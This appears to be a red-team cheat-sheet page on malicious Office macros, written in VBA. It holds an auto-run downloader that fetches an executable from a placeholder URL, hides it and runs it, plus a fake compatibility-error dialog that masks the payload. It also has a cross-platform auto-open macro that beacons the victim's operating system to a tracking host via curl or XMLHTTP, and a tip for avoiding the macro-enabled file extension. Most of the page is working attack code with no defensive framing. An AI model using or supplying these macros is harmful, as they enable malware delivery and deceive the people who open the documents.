# Macros

## Tips

* Save Word document as "Word 97-2004 Document .doc" to not have to use the "Word Macro-Enabled Document (.docm)
*

## Simple Download / Exec

```
Sub Auto_Open()

Const ADTYPEBINARY = 1
Const ADSAVECREATEOVERWRITE = 2

Dim xHttp
Dim bStrm
Dim filename

Set xHttp = CreateObject("Microsoft.XMLHTTP")
xHttp.Open "GET", "https://.../payload.exe", False
xHttp.Send

Set gobjBinaryOutputStream = CreateObject("Adodb.Stream")

filename = Environ("USERPROFILE") & "\" & DateDiff("s", #1/1/1970#, Now())

gobjBinaryOutputStream.Type = ADTYPEBINARY
gobjBinaryOutputStream.Open
gobjBinaryOutputStream.write xHttp.responseBody
gobjBinaryOutputStream.savetofile filename, ADSAVECREATEOVERWRITE

SetAttr filename, vbReadOnly + vbHidden + vbSystem
Shell (filename)

End Sub
```

Inspired by [https://gist.github.com/nopslider/0d48760928642ca190ed](https://gist.github.com/nopslider/0d48760928642ca190ed)

## Print dummy error message and quit

```
Dim title As String
title = "Microsoft Office (Compatibility Mode)"
Dim msg As String
Dim intResponse As Integer
msg = "This application appears to have been made with an older version of the Microsoft Office product suite. Please have the author save this document to a newer and supported format. [Error Code: -219]"
intResponse = MsgBox(msg, 16, title)
Application.Quit
```

Source: [Unicorn](unicorn.md)

## Cross Platform (Windows / OSX) GET Macro

```csharp
#If Mac Then
    Private Declare PtrSafe Function web_popen Lib "libc.dylib" Alias "popen" (ByVal command As String, ByVal mode As String) As LongPtr
    Private Declare PtrSafe Function web_pclose Lib "libc.dylib" Alias "pclose" (ByVal file As LongPtr) As Long
    Private Declare PtrSafe Function web_fread Lib "libc.dylib" Alias "fread" (ByVal outStr As String, ByVal size As LongPtr, ByVal items As LongPtr, ByVal stream As LongPtr) As Long
    Private Declare PtrSafe Function web_feof Lib "libc.dylib" Alias "feof" (ByVal file As LongPtr) As LongPtr
#End If

Sub AutoOpen()
    Debugging
End Sub

Sub Auto_Open()
    Debugging
End Sub

Sub Document_Open()
    Debugging
End Sub

Public Function executeInShell(web_Command As String) As String

    Dim web_File As LongPtr
    Dim web_Chunk As String
    Dim web_Read As Long

    On Error GoTo web_Cleanup

    web_File = web_popen(web_Command, "r")

    If web_File = 0 Then
        Exit Function
    End If

    Do While web_feof(web_File) = 0
        web_Chunk = VBA.Space$(50)
        web_Read = web_fread(web_Chunk, 1, Len(web_Chunk) - 1, web_File)
        If web_Read > 0 Then
            web_Chunk = VBA.Left$(web_Chunk, web_Read)
            executeInShell = executeInShell & web_Chunk
        End If
    Loop

web_Cleanup:

    web_pclose (web_File)

End Function

Public Function getHTTP(sURL As String, sQuery As String) As String
    Dim sCmd As String
    Dim sResult As String
    Dim lExitCode As Long
    sCmd = "curl --get -d """ & sQuery & """" & " " & sURL
    sResult = executeInShell(sCmd)
    getHTTP = sResult
End Function

Public Function Debugging() As Variant

    Dim sURL
 
    sURL = "https://target.com/index.php"

    On Error Resume Next
            Dim tracking As String
            tracking = sURL
            
            #If Mac Then
                'Mac Rendering
                getHTTP tracking, "d=Mac"
            #Else
                'Windows Rendering
                Dim objWeb As Object
                Set objWeb = CreateObject("Microsoft.XMLHTTP")
                objWeb.Open "GET", "https://target.com/index.php?d=" & "Windows", False
                objWeb.send
            #End If
End Function
```
